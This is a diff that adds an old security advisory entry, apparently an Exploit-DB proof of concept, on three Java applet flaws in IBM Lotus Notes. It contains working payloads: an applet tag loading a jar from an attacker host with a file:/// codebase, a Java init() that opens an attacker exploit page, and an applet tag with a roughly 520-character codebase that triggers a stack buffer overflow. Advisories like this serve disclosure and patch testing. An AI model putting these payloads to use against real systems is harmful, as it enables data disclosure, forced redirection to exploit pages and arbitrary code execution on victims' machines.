@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/10704/info
+
+IBM Lotus Notes is affected by three vulnerabilities concerning Java applets.
+
+An attacker can exploit these issues to disclose potentially sensitive information, cause a web browser to open an arbitrary web page, and cause a stack-based buffer overflow that may be exploited to execute arbitrary code.
+
+IBM has confirmed these vulnerabilities and has stated that they are currently under investigation. IBM problem reports for these vulnerabilities are KSPR5YS6GR, KSPR62F4D3, and KSPR62F4KN. 
+
+<applet codebase="file:///" archive="http://www.attacker.tld/applet.jar" width="1" height="1"></applet>
+
+Arbitrary browser opening:
+public void init() {
+getAppletContext().showDocument("http://www.attacker.tld/ie-exploits.html");
+}
+
+Stack-based buffer overflow:
+<applet codebase="A:AAAAAAAAAAAAAAA( repeat 520 A's )AAAAAA" code="java.applet.Applet" width=100 height=100></applet> 
